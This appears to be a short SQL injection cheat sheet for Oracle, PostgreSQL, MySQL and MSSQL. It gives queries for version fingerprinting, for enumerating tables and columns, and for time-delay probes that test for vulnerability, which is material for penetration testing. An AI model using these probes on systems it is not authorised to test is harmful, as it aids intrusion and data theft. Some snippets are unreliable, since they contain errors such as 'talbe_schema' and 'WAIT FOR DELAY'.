  
## Oracle

* Finding version

```sql
SELECT * FROM v$version;
SELECT * FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE rownum=1
```

* Finding tables

```sql
SELECT table_name FROM all_tables
```

* Finding columns for every table

```sql
SELECT table_name, column_name FROM all_tab_columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
BEGIN DBMS_LOCK.SLEEP(seconds); END;
```

## Postgres SQL

* Finding version

```sql
SELECT version()
```

* Finding tables

```sql
SELECT table_schema,table_name FROM information_schema.tables
SELECT tablename from pg_tables
```

* Finding columns for every table

```sql
SELECT table_schema,table_name,column_name FROM information_schema.columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
PG_SLEEP(seconds)
```

## MySQL

* Finding version

```sql
SELECT @@ version
```

* Finding tables

```sql
SELECT table_schema,table_name FROM information_schema.tables
```

* Finding columns for every table

```sql
SELECT talbe_schema,table_name,column_name FROM information_schema.columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
SLEEP(seconds)
```

## MSSQL

* Finding version

```sql
SELECT @@ version
```

* Finding tables

```sql
SELECT table_schema,table_name FROM information_schema.tables
SELECT name FROM sysobjects WHERE xtype = 'U' --
```

* Finding columns for every table

```sql
SELECT table_schema,table_name,column_name FROM information_schema.columns
```

* Inducing _Time Delay_ to determine if the application is vulnerable to SQLi

```sql
WAIT FOR DELAY '00:00:SS'
```